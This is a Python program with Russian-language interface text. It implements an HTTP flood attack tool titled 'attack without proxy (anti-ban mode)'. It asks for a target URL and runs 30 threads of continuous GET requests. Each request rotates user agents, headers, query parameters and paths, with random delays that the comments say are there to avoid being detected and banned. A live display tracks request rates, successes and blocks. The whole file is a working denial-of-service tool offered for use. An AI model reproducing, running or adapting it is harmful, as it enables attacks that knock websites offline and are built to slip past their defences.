import os
import sys
import time
import random
import json
import threading
import requests
from datetime import datetime
from urllib.parse import urlparse

# ================= НАСТРОЙКИ =================
MAX_THREADS = 30  # Умеренно, чтобы не забанили
TIMEOUT = 5
REQUEST_DELAY_MIN = 0.05  # Минимальная задержка
REQUEST_DELAY_MAX = 0.3   # Максимальная задержка

# ================= USER-AGENT =================
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.76',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Android 14; Mobile; rv:109.0) Gecko/109.0 Firefox/121.0',
    'Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
    # Добавьте ещё 50+ своих
]

# ================= ЦВЕТА =================
G = "\033[92m"
R = "\033[91m"
Y = "\033[93m"
C = "\033[96m"
W = "\033[97m"
E = "\033[0m"
G7 = "\033[38;2;50;255;50m"

# ================= ВСПОМОГАТЕЛЬНЫЕ =================
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def bar(p, w=20):
    p = max(0, min(100, p))
    f = int(w * p / 100)
    return f"[{G7 + '█' * f + E + '░' * (w - f)}] {p}%"

def random_headers():
    """Генерирует случайные заголовки"""
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': random.choice(['*/*', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'application/json']),
        'Accept-Language': random.choice(['ru-RU,ru;q=0.9,en;q=0.8', 'en-US,en;q=0.9', 'de-DE,de;q=0.8,en;q=0.7']),
        'Accept-Encoding': random.choice(['gzip, deflate', 'gzip', 'deflate', 'br']),
        'Cache-Control': random.choice(['no-cache', 'max-age=0', 'no-store']),
        'Connection': random.choice(['keep-alive', 'close']),
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': random.choice(['document', 'empty', 'script', 'style']),
        'Sec-Fetch-Mode': random.choice(['navigate', 'cors', 'no-cors']),
        'Sec-Fetch-Site': random.choice(['same-origin', 'cross-site', 'none']),
    }

def random_params():
    """Случайные параметры для URL"""
    return {
        't': random.randint(1000, 9999),
        'r': random.random(),
        'sid': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz123456789', k=8)),
        'v': random.randint(1, 5),
        'cb': str(random.randint(100000, 999999))
    }

def random_path(base_url):
    """Добавляет случайный путь к URL"""
    paths = ['/', '/index.html', '/api/v1/test', '/images/logo.png', '/css/style.css', 
             '/js/script.js', '/favicon.ico', '/robots.txt', '/sitemap.xml',
             '/wp-content/themes/twentythree/style.css', '/static/js/main.js']
    parsed = urlparse(base_url)
    base = f"{parsed.scheme}://{parsed.netloc}"
    return base + random.choice(paths)

# ================= АТАКА С АНТИ-БАНОМ =================
class Attack:
    def __init__(self):
        self.running = False
        self.req = 0
        self.ok = 0
        self.err = 0
        self.ban = 0
        self.bytes = 0
        self.start = 0
        self.lock = threading.Lock()
        self.session = requests.Session()
    
    def http_worker(self, base_url):
        try:
            # Рандомный URL с параметрами
            url = random_path(base_url)
            params = random_params()
            headers = random_headers()
            
            # Задержка чтобы не спалить
            time.sleep(random.uniform(REQUEST_DELAY_MIN, REQUEST_DELAY_MAX))
            
            # Отправка запроса
            response = self.session.get(
                url,
                params=params,
                headers=headers,
                timeout=TIMEOUT,
                allow_redirects=True
            )
            
            with self.lock:
                self.req += 1
                self.bytes += len(response.content)
                
                # Разные коды ответа
                if response.status_code in [200, 301, 302, 304, 404]:
                    self.ok += 1
                elif response.status_code in [403, 429, 503, 401]:
                    self.ban += 1
                    self.err += 1
                else:
                    self.err += 1
                    
        except requests.exceptions.Timeout:
            with self.lock:
                self.req += 1
                self.err += 1
        except requests.exceptions.ConnectionError:
            with self.lock:
                self.req += 1
                self.err += 1
        except:
            with self.lock:
                self.req += 1
                self.err += 1

    def start_http(self, url, threads):
        self.running = True
        self.req = self.ok = self.err = self.ban = self.bytes = 0
        self.start = time.time()
        
        def worker():
            while self.running:
                self.http_worker(url)
        
        threads_list = []
        for _ in range(threads):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            threads_list.append(t)
        
        while self.running:
            time.sleep(0.1)
        
        for t in threads_list:
            t.join(timeout=0.1)

    def stop(self):
        self.running = False

# ================= ВЫВОД =================
def attack_view_smooth(url, threads, a, prev_data=None):
    elapsed = int(time.time() - a.start)
    rate = int(a.req / elapsed) if elapsed > 0 else 0
    load = min(100, int((rate / (threads * 10)) * 100)) if threads > 0 else 0
    
    data = {'req': a.req, 'ok': a.ok, 'err': a.err, 'ban': a.ban,
            'bytes': a.bytes, 'elapsed': elapsed, 'rate': rate, 'load': load}
    
    if prev_data and data == prev_data:
        return data
    
    sys.stdout.write('\033[H\033[J')
    sys.stdout.flush()
    
    output = f"""
{G7}⚠ АТАКА БЕЗ ПРОКСИ (АНТИ-БАН РЕЖИМ)

{C}Цель      : {W}{url[:40]}
{C}Потоки    : {W}{threads}  [{bar(load)}]
{C}Запросы   : {W}{a.req:,}
{C}Скорость  : {W}{rate:,} r/s
{G}✅ Успешно : {W}{a.ok:,}
{R}❌ Ошибки  : {W}{a.err:,}
{Y}🚫 Бан     : {W}{a.ban}
{C}Время     : {W}{elapsed//3600:02d}:{elapsed%3600//60:02d}:{elapsed%60:02d}
{C}Данные    : {W}{a.bytes/1024/1024:.1f} MB

{Y}💡 Стратегия защиты:
   • Случайные User-Agent ({len(USER_AGENTS)} шт.)
   • Случайные заголовки
   • Случайные параметры
   • Случайные пути
   • Задержки {REQUEST_DELAY_MIN}-{REQUEST_DELAY_MAX} сек

{G7}[Press ENTER to stop]
{E}
"""
    sys.stdout.write(output)
    sys.stdout.flush()
    return data

# ================= ЗАПУСК =================
def run_test():
    clear()
    print(f"""
{G7}⚠ АТАКА БЕЗ ПРОКСИ

{Y}ВНИМАНИЕ: Используется ваш реальный IP!
{C}Рекомендуется:
   • 10-30 потоков
   • Задержки между запросами
   • Рандомизация всех параметров

{G7}Нажми ENTER для продолжения...{E}
""")
    input()
    
    url = input(f"{C}Цель: {W}")
    if not url.startswith('http'):
        url = 'http://' + url
    
    threads = 30  # Оптимально для без прокси
    print(f"{C}Потоки: {W}{threads} (оптимально)")
    
    a = Attack()
    t = threading.Thread(target=a.start_http, args=(url, threads), daemon=True)
    t.start()
    
    stop = [False]
    def wait():
        input()
        stop[0] = True
        a.stop()
    threading.Thread(target=wait, daemon=True).start()
    
    prev_data = None
    try:
        while a.running and not stop[0]:
            prev_data = attack_view_smooth(url, threads, a, prev_data)
            time.sleep(0.3)
    except KeyboardInterrupt:
        a.stop()
    
    a.stop()
    t.join(timeout=0.5)
    
    clear()
    print(f"""
{G7}АТАКА ЗАВЕРШЕНА

{G}✅ Успешно: {a.ok:,}
{R}❌ Ошибки: {a.err:,}
{Y}🚫 Бан: {a.ban}
{C}Всего: {a.req:,}
{C}Время: {int(time.time() - a.start)} сек
{E}
""")
    input(f"{G7}Нажми ENTER для возврата...{E}")

# ================= МЕНЮ =================
def menu():
    clear()
    print(f"""
{G7}ГЛАВНОЕ МЕНЮ

{C}1.{W} Атака без прокси (анти-бан)
{C}99.{W} Exit
{E}
""")

# ================= MAIN =================
def main():
    while True:
        menu()
        ch = input(f"{G7}Выбери: {W}")
        if ch == '1':
            run_test()
        elif ch == '99':
            clear()
            print(f"{G7}Выход...{E}")
            sys.exit()
        else:
            print(f"{R}Неверный выбор!{E}")
            time.sleep(1)

if __name__ == "__main__":
    main()
